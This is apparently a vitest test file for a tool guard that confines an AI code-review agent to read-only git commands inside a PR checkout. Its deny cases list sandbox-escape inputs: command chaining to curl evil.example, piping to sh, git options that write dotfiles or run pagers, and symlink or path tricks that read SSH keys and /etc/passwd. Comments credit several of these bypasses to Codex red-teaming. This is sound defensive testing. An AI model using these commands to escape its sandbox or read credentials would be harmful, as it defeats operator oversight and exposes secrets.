import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  bashRuleMatches,
  evaluateToolCall,
  tokenize,
  toolGuardHook,
  type GuardContext,
} from '../../src/review/tool-guard.js';

const root = mkdtempSync(path.join(tmpdir(), 'ra-guard-'));
const checkout = path.join(root, 'checkout');
const conventions = path.join(root, 'conventions');
const secretDir = path.join(root, 'home', '.ssh');
mkdirSync(path.join(checkout, 'src'), { recursive: true });
mkdirSync(conventions, { recursive: true });
mkdirSync(secretDir, { recursive: true });
writeFileSync(path.join(checkout, 'src', 'a.ts'), 'x');
writeFileSync(path.join(secretDir, 'id_ed25519'), 'secret');
// A PR can commit a symlink that points outside the checkout.
symlinkSync(path.join(secretDir, 'id_ed25519'), path.join(checkout, 'innocent.txt'));
// ...or a symlinked directory, so a plain relative path walks out of it.
symlinkSync(path.join(root, 'home'), path.join(checkout, 'outside'));

const ctx: GuardContext = { cwd: checkout, readableRoots: [checkout, conventions], extraRules: [] };
const allowed = (tool: string, input: unknown, c = ctx) => evaluateToolCall(tool, input, c).allow;
const bash = (command: string, c = ctx) => allowed('Bash', { command }, c);

describe('Bash', () => {
  it.each([
    'git diff abc...HEAD --stat',
    'git diff --name-only abc...HEAD',
    'git log -p -n 5 -- src/a.ts',
    'git show HEAD~1:src/a.ts',
    "git grep -n 'TODO' -- '*.ts'",
    'git blame -L 10,20 src/a.ts',
    'git ls-files',
    'git grep -nE "foo|bar"',
    "git grep -n 'func('",
    'git log -S"x()" --oneline',
    "git grep -n 'end$'",
    "git show 'HEAD@{1}'",
    'git diff --text HEAD~1',
    `git log -- ${path.join(checkout, 'src', 'a.ts')}`,
    "git log --format='%H %s'",
  ])('allows %s', (command) => {
    expect(bash(command)).toBe(true);
  });

  it.each([
    ['writing files via --output', 'git show HEAD:payload --output=/Users/me/.zshenv'],
    ['writing files via --output with a separate value', 'git diff --output /tmp/x'],
    ['reading outside the repo via --no-index', 'git diff --no-index /Users/me/.ssh/id_rsa /dev/null'],
    ['reading arbitrary files via blame --contents', 'git blame --contents /etc/passwd a.ts'],
    ['running a pager via grep -O', 'git grep -Ocat foo'],
    ['running a pager in a short-option cluster', 'git grep -nO foo'],
    ['external diff drivers', 'git diff --ext-diff'],
    ['global options', 'git -c core.pager=sh log'],
    ['changing directory', 'git -C /Users/me log'],
    ['ref-changing subcommands', 'git branch -f main HEAD'],
    ['pushing', 'git push origin HEAD'],
    ['command chaining', 'git diff && curl https://evil.example'],
    ['pipes', 'git diff | sh'],
    ['redirection', 'git diff > /Users/me/.zshrc'],
    ['command substitution', 'git log $(curl evil)'],
    ['backticks', 'git log `id`'],
    ['subshells', 'git log (id)'],
    ['newlines', 'git status\ncurl evil'],
    ['non-git commands', 'cat /Users/me/.ssh/id_rsa'],
    ['gh', 'gh api repos/o/r/pulls/1/reviews -f event=APPROVE'],
    ['unbalanced quotes', "git log 'oops"],
    ['variable expansion inside double quotes', 'git log "$HOME"'],
    ['substitution inside double quotes', 'git log "$(id)"'],
    ['an abbreviated --output', 'git show HEAD --outp=/Users/me/.zshenv'],
    ['an abbreviated --open-files-in-pager', 'git grep --open-files=cat x'],
    // Found by Codex against the previous version of the guard:
    ['brace expansion into --output', 'git show --{output=/tmp/review-proof,stat} HEAD'],
    ['a two-letter abbreviation that runs a pager command', 'git grep --op=echo --untracked x -- src/a.ts'],
    ['implicit --no-index via paths outside the repo', 'git diff /dev/null /etc/hosts'],
    ['an orderfile outside the repo', 'git diff -O/etc/hosts'],
    ['a pattern file outside the repo', 'git grep -f /etc/hosts'],
    // Same family:
    ['a parent-relative path', 'git diff HEAD -- ../../home/.ssh/id_ed25519'],
    ['unquoted globs that a committed file name could turn into an option', 'git diff *'],
    ['zsh =command expansion', 'git diff =cat =sh'],
    ['tilde paths', 'git grep -f ~/.ssh/id_rsa x'],
    ['unquoted braces', 'git show HEAD@{1}'],
    // Found by Codex in the second round:
    ['a pager hidden behind a numeric context option', 'git grep -1Osh marker -- payload.sh'],
    ['--text as an abbreviation of --textconv', 'git cat-file --text HEAD:src/a.ts'],
    [
      'implicit --no-index through an allowed directory and a committed symlink',
      `git diff "${path.join(conventions, 'PR_DESCRIPTION.md')}" outside/.ssh/id_ed25519`,
    ],
    ['a pattern file behind a committed symlink', 'git grep -f innocent.txt x'],
    ['an attached option value behind a committed symlink', 'git diff -Ooutside/.ssh/id_ed25519'],
    // Found by Codex in the third round:
    ['.. after a committed symlink (the OS follows the link first)', 'git grep -f outside/../.env x'],
    ['a file argument hidden in a short-option cluster', 'git grep -nf/etc/hosts x -- src/a.ts'],
  ])('denies %s', (_name, command) => {
    expect(bash(command)).toBe(false);
  });

  it('allows operator-approved commands but still forbids chaining them', () => {
    const c = { ...ctx, extraRules: ['Bash(python3 ~/.claude/skills/kb/match.py *)'] };

    expect(bash('python3 ~/.claude/skills/kb/match.py --base origin/main', c)).toBe(true);
    expect(bash('python3 ~/.claude/skills/kb/match.py --base x && touch /tmp/pwned', c)).toBe(false);
    expect(bash('python3 other.py', c)).toBe(false);
  });
});

describe('Read / Grep / Glob', () => {
  it('allows files inside the checkout and the conventions directory', () => {
    expect(allowed('Read', { file_path: path.join(checkout, 'src', 'a.ts') })).toBe(true);
    expect(allowed('Read', { file_path: 'src/a.ts' })).toBe(true);
    expect(allowed('Read', { file_path: path.join(conventions, 'CLAUDE.md') })).toBe(true);
  });

  it('denies files outside, including via ..', () => {
    expect(allowed('Read', { file_path: path.join(secretDir, 'id_ed25519') })).toBe(false);
    expect(allowed('Read', { file_path: '../home/.ssh/id_ed25519' })).toBe(false);
    expect(allowed('Read', { file_path: '/etc/passwd' })).toBe(false);
  });

  it('denies a symlink in the checkout that points outside', () => {
    expect(allowed('Read', { file_path: 'innocent.txt' })).toBe(false);
  });

  it('confines Grep and Glob search roots and patterns', () => {
    expect(allowed('Grep', { pattern: 'x' })).toBe(true);
    expect(allowed('Grep', { pattern: 'x', path: secretDir })).toBe(false);
    expect(allowed('Glob', { pattern: '**/*.ts' })).toBe(true);
    expect(allowed('Glob', { pattern: '/Users/**/.env' })).toBe(false);
    expect(allowed('Glob', { pattern: '../../**' })).toBe(false);
  });
});

describe('other tools', () => {
  it('allows subagents, skills and structured output', () => {
    for (const tool of ['Agent', 'Task', 'Skill', 'StructuredOutput']) expect(allowed(tool, {})).toBe(true);
  });

  it('limits subagents and skills to the configured ones', () => {
    const c = { ...ctx, allowedAgents: ['rv:correctness'], allowedSkills: ['rv:pr-review', 'kb'] };

    expect(allowed('Agent', { subagent_type: 'rv:correctness' }, c)).toBe(true);
    expect(allowed('Agent', { subagent_type: 'general-purpose' }, c)).toBe(true);
    expect(allowed('Agent', {}, c)).toBe(true);
    // A personal agent may carry hooks that run scripts from the checkout.
    expect(allowed('Agent', { subagent_type: 'db-reader' }, c)).toBe(false);
    expect(allowed('Task', { subagent_type: 'db-reader' }, c)).toBe(false);
    expect(allowed('Skill', { skill: 'kb' }, c)).toBe(true);
    expect(allowed('Skill', { skill: '/rv:pr-review' }, c)).toBe(true);
    expect(allowed('Skill', { skill: 'deploy' }, c)).toBe(false);
  });

  it('refuses .. in Read, Grep and Glob paths even when they normalise inside', () => {
    expect(allowed('Read', { file_path: 'outside/../src/a.ts' })).toBe(false);
    expect(allowed('Grep', { pattern: 'x', path: 'src/../src' })).toBe(false);
  });

  it('denies writes, web access and any MCP tool by default', () => {
    const tools = [
      'Edit',
      'Write',
      'NotebookEdit',
      'WebFetch',
      'mcp__slack__send_message',
      'mcp__gh__review_write',
    ];
    for (const tool of tools) expect(allowed(tool, {})).toBe(false);
  });

  it('allows a tool name the operator listed explicitly', () => {
    expect(allowed('mcp__kb__search', {}, { ...ctx, extraRules: ['mcp__kb__search'] })).toBe(true);
  });
});

describe('toolGuardHook', () => {
  const signal = new AbortController().signal;

  it('returns a deny decision with the reason and reports it', async () => {
    const denied: string[] = [];
    const hook = toolGuardHook(ctx, (tool, reason) => denied.push(`${tool}: ${reason}`)).hooks[0]!;

    const out = await hook(
      { hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: {}, tool_use_id: 't' } as never,
      't',
      { signal },
    );

    expect(out).toMatchObject({ hookSpecificOutput: { permissionDecision: 'deny' } });
    expect(denied[0]).toMatch(/^Write: /);
  });

  it('stays silent for allowed calls', async () => {
    const hook = toolGuardHook(ctx).hooks[0]!;
    const input = {
      hook_event_name: 'PreToolUse',
      tool_name: 'Bash',
      tool_input: { command: 'git status' },
      tool_use_id: 't',
    };

    expect(await hook(input as never, 't', { signal })).toEqual({});
  });
});

describe('helpers', () => {
  it('tokenize honours quotes', () => {
    expect(tokenize(`git grep -n "a b" 'c d'`)).toEqual(['git', 'grep', '-n', 'a b', 'c d']);
    expect(tokenize('git "x')).toBeNull();
  });

  it('bashRuleMatches supports the legacy :* suffix', () => {
    expect(bashRuleMatches('Bash(make lint:*)', 'make lint --fast')).toBe(true);
    expect(bashRuleMatches('Bash(make lint)', 'make lint --fast')).toBe(false);
  });
});
